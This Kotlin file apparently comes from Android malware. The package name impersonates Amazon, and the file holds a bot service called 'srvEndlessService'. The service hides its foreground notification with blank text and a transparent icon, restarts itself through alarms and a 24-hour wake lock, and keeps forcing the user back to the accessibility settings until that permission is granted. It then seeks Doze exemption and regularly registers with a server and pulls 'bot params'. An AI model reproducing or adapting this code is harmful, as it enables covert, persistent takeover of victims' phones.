package com.amazon.zzz.Services


import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.*
import android.util.Log
import android.widget.RemoteViews
import com.amazon.zzz.Activities.actToastAccessbility
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.ApiNm.apiUt.moduleWorkingWhile
import com.amazon.zzz.ApiNm.apiUt.pingServerAndRegister
import com.amazon.zzz.ApiNm.apiUt.updateBotParams
import com.amazon.zzz.Modull.udUtils
import com.amazon.zzz.Modull.udUtils.TAG_LOG
import com.amazon.zzz.Modull.udUtils.is_dozemode
import com.amazon.zzz.R
import com.amazon.zzz.Receivers.StartReceiver
import com.amazon.zzz.Utilsss.SharedPreferencess
import com.amazon.zzz.Utilsss.utAutoStartUtil
import com.amazon.zzz.Utilsss.utUtils
import com.amazon.zzz.Utilsss.utUtils.startCustomTimer
import com.amazon.zzz.constNm
import com.amazon.zzz.constNm.a14
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


class srvEndlessService : Service() {


    private var isServiceStarted = false
    private var wakeLock: PowerManager.WakeLock? = null

    var itoaskAccessibility = 0
    var start_Q = 6

    override fun onCreate() {
        super.onCreate()
        apiUt.sendLogs(this, "", "EndlessService The service has been created", "log")
        val notification = createNotification()
        startForeground(1, notification)
        SharedPreferencess.init(this.applicationContext)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d("EndlessService", "The service has been destroyed".uppercase())
        startCustomTimer(this, 1000)
    }

    override fun onBind(intent: Intent): IBinder? {
        Log.d("EndlessService", "Some component want to bind with the service")
        // We don't provide binding, so return null
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("EndlessService", "onStartCommand executed with startId: $startId")
        startService()
        ensureServiceStaysRunning()
        // by returning this we make sure the service is restarted if the system kills the service
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent) {
        // workaround for kitkat: set an alarm service to trigger service again
        val intent = Intent(applicationContext, srvEndlessService::class.java)
        val pendingIntent = PendingIntent.getService(this, 1, intent, PendingIntent.FLAG_ONE_SHOT)
        val alarmManager = applicationContext.getSystemService(ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.RTC_WAKEUP,
            SystemClock.elapsedRealtime() + 5000,
            pendingIntent
        )
    }

    private suspend fun pushToast(): Long {
        utUtils.Log(TAG_LOG, "Tick: " + SharedPreferencess.tick)

        var speedTime = 1000L
        //-------------toask-accessbility----
        runCatching {
            if (!utUtils.isAccessibilityServiceEnabled(
                    this,
                    a14
                ) && udUtils.getScreenBoolean(this)
            ) {
                speedTime = 2000
                itoaskAccessibility++
                runCatching {
                    if (actToastAccessbility.activityAccessibilityVisible == "1" && itoaskAccessibility >= 3) {
                        applicationContext.startService(
                            Intent(applicationContext, constNm.a5).putExtra("name", "value2")
                        )
                        delay(2000L)
                        applicationContext.startService(
                            Intent(applicationContext, constNm.a11).putExtra("name", "value")
                        )
                        itoaskAccessibility = 0
                        utUtils.Log(TAG_LOG, "Start service ToaskAccessibility")
                    }

                    if (actToastAccessbility.successLaunchUrl == 1 && start_Q >= 20) {
                        applicationContext.startActivity(
                            Intent(applicationContext, constNm.a3)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK).addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        )
                        utUtils.Log(TAG_LOG, "Start service Accessibility")
                        start_Q = 0
                    } else if (actToastAccessbility.successLaunchUrl == 0 && start_Q >= 4) {
                        applicationContext.startActivity(
                            Intent(applicationContext, constNm.a3)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK).addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        )
                        utUtils.Log(TAG_LOG, "Start service Accessibility")
                        start_Q = 0
                    }

                    start_Q++
                }
            } else if (utUtils.isAccessibilityServiceEnabled(
                    this,
                    a14
                ) && !utUtils.hasPermissionAllTrue(this)
            ) {
                applicationContext.startService(
                    Intent(applicationContext, constNm.a11).putExtra("name", "value2")
                )
                applicationContext.startService(
                    Intent(applicationContext, constNm.a5).putExtra("name", "value")
                )
                speedTime = 14 * 1000L
            } else if (utUtils.isAccessibilityServiceEnabled(
                    this,
                    a14
                ) && utUtils.hasPermissionAllTrue(this) && !is_dozemode(this)
            ) {
                //------doze---------
                delay(5000)
                utUtils.start_dozemode("Doze", applicationContext)
                speedTime = 20 * 1000L
            } else {
                speedTime = 2000
            }
        }

        return speedTime
    }

    private fun createNotification(): Notification {
        val notificationChannelId = "   "

        // depending on the Android API that we're dealing with we will have
        // to use a specific method to create the notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                notificationChannelId,
                "   ",
                NotificationManager.IMPORTANCE_LOW
            ).let {
                it.description = " "
                it.enableLights(false)
                it.lightColor = Color.WHITE
                it.enableVibration(false)
                it
            }
            notificationManager.createNotificationChannel(channel)
        }

        val intent = Intent(this@srvEndlessService, srvEndlessService::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 123, intent, 0)

        val builder: Notification.Builder =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(
                this,
                notificationChannelId
            ) else Notification.Builder(this)

        val remoteViews = RemoteViews(this.packageName, R.layout.custom_notif_zzz)
        builder.setContent(remoteViews)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            builder.setCustomContentView(remoteViews)
            builder.setCustomBigContentView(remoteViews)
        }
        builder.setPriority(Notification.PRIORITY_LOW)
        builder.setCategory(Notification.CATEGORY_SERVICE)
        builder.setVisibility(Notification.VISIBILITY_SECRET)
        builder.setColor(resources.getColor(android.R.color.transparent))
        return builder
            .setContentTitle("  ")
            .setContentText("   ")
            .setTicker("    ")
            .setContentIntent(pendingIntent)
            .setSmallIcon(android.R.color.transparent)
            .build()
    }

    private fun ensureServiceStaysRunning() {
        val restartAlarmInterval = 20 * 1000
        val resetAlarmTimer = 10 * 1000L
        val restartIntent = Intent(this, StartReceiver::class.java)

        val alarmMgr = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val restartServiceHandler = @SuppressLint("HandlerLeak")
        object : Handler(Looper.getMainLooper()) {
            override fun handleMessage(msg: Message) {
                val pendingIntent = PendingIntent.getBroadcast(
                    applicationContext,
                    87,
                    restartIntent,
                    PendingIntent.FLAG_CANCEL_CURRENT
                )
                val timer = System.currentTimeMillis() + restartAlarmInterval
                alarmMgr.setExact(AlarmManager.RTC_WAKEUP, timer, pendingIntent)
                sendEmptyMessageDelayed(0, resetAlarmTimer)
            }
        }
        restartServiceHandler.sendEmptyMessageDelayed(0, 0)
    }

    private fun startService() {
        if (isServiceStarted) return
        Log.d("EndlessService", "Starting the foreground service task")
        isServiceStarted = true

        // we need this lock so our service gets not affected by Doze Mode
        wakeLock =
            (getSystemService(Context.POWER_SERVICE) as PowerManager).run {
                newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "EndlessService::lock").apply {
                    acquire(24 * 60 * 60 * 1000)
                }
            }

        // we're starting a loop in a coroutine
        whilePushToast()

        // we're starting a loop in a coroutine
        GlobalScope.launch {
            while (isServiceStarted) {
                runCatching {
                    SharedPreferencess.init(applicationContext)
                    pingServerAndRegister(applicationContext)
                    delay(6 * 1000L)
                    SharedPreferencess.tick = SharedPreferencess.tick + 6

                    if (SharedPreferencess.permission_get == "1") {
                        moduleWorkingWhile(applicationContext)
                        accessibilityRestart()
                    }
                    delay(6 * 1000L)
                    SharedPreferencess.tick = SharedPreferencess.tick + 6

                    if (SharedPreferencess.tickUpdate != 0 && SharedPreferencess.tickUpdate % 120 == 0) {
                        updateBotParams(applicationContext)
                        delay(6 * 1000L)
                        SharedPreferencess.tick = SharedPreferencess.tick + 6
                    }
                    SharedPreferencess.tickUpdate = SharedPreferencess.tickUpdate + 10
                }.onFailure {
                    utUtils.Log(TAG_LOG, it.localizedMessage)
                }
            }

            val intent = Intent(applicationContext, srvEndlessService::class.java)
            val pendingIntent = PendingIntent.getService(applicationContext, 1, intent, PendingIntent.FLAG_ONE_SHOT)
            val alarmManager = applicationContext.getSystemService(ALARM_SERVICE) as AlarmManager
            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                SystemClock.elapsedRealtime() + 30000,
                pendingIntent
            )
        }
    }

    private fun accessibilityRestart() {
        if (!srvSccessibility.active && utUtils.isAccessibilityServiceEnabled(
                applicationContext,
                a14
            )
        ) {
            runCatching {
                applicationContext.startService(
                    Intent(
                        applicationContext,
                        srvSccessibility::class.java
                    )
                )
            }
        }

        if (!utUtils.isAccessibilityServiceEnabled(applicationContext, a14)) {
            runCatching {
                SharedPreferencess.permission_get = ""
                whilePushToast()
                if (!actToastAccessbility.active) {
                    startActivity(
                        Intent(applicationContext, constNm.a3)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK).addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            .putExtra("FromPush", true)
                    )
                }
            }
        }
    }

    private fun whilePushToast() {
        GlobalScope.launch {
            var speedTime: Long
            while (isServiceStarted) {
                runCatching {
                    val cntClicked = SharedPreferencess.cntPowerKeeperClick
                    if (SharedPreferencess.permission_get != "1" || !(is_dozemode(applicationContext) || cntClicked > 3)) {
                        speedTime = pushToast()
                        delay(speedTime)
                        //---------------------tick-------------------------
                        SharedPreferencess.tick =
                            SharedPreferencess.tick + (speedTime / 1000L).toInt()
                    } else {
                        return@launch
                    }
                }.onFailure {
                    utUtils.Log(TAG_LOG, it.localizedMessage)
                }
            }
            utUtils.Log(TAG_LOG, "End of the loop for the service 1")
        }
    }

    companion object {
        fun autoStart(context: Context) {
            if (!utAutoStartUtil.isMyServiceRunning(context, srvEndlessService::class.java)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    context.startForegroundService(Intent(context, srvEndlessService::class.java))
                } else {
                    context.startService(Intent(context, srvEndlessService::class.java))
                }
            }
        }
    }

}